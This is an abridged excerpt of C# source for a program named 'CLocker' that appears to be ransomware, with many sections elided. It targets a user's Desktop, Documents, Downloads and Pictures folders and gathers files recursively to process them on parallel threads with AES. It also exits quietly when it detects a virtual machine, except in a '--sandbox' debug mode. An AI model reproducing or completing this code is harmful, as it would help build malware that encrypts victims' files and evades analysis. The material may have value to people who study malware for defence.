...
namespace CLocker
{
    class Program
    {
        ...
        public static bool __SANDBOX = false;
        ...
        private static int Main(string[] args)
        {
            ...
            if (args.Contains("--sandbox")) {
                ...
                while (true)
                {
                    Console.Write("[DEBUG] [ Main ] Enter the sandbox location: ");
                    string path = Console.ReadLine();
                    if (Path.Exists(path))
                    {
                        __USER_DIRECT = path;       // Set custom user directory for testing.

                        // Init target path
                        __TARGET_PATH = new string[] {
                            Path.Combine(__USER_DIRECT, "Desktop"),                 // User Desktop     C:/Users/%username%/Desktop
                            Path.Combine(__USER_DIRECT, "Documents"),               // User Documents   C:/Users/%username%/Documents
                            Path.Combine(__USER_DIRECT, "Downloads"),               // User Downloads   C:/Users/%username%/Downloads
                            Path.Combine(__USER_DIRECT, "Pictures"),                // User Pictures    C:/Users/%username%/Pictures
                    ...
                    {
                        Console.WriteLine("[DEBUG] [ Main ] Given path is not valid.");
                    }
                }
            }
            ...
            if (__SANDBOX == false && IsBadAES()) { Environment.Exit(0x414553); }   // AES encryption is not valid.
            if (__SANDBOX == false && IsVM()) { Environment.Exit(0x564D); }         // Virtual machine is on running.
            ...
            foreach (string FILE in __FILES)
            {
                Task thread = Task.Run(() =>
                {
                    ...
                    if (__DATA == __DEC_DATA) { Console.WriteLine($"[DEBUG] [ Main ] AES checksum failed."); return; }
                    if (__SAFETY == true)
                    {
        ...
        private static string[] GetFiles(string path)
        {
            ...
            foreach(string dir in Directory.GetDirectories(path))
            {
                try
                {
                    string[] child_files = GetFiles(dir);
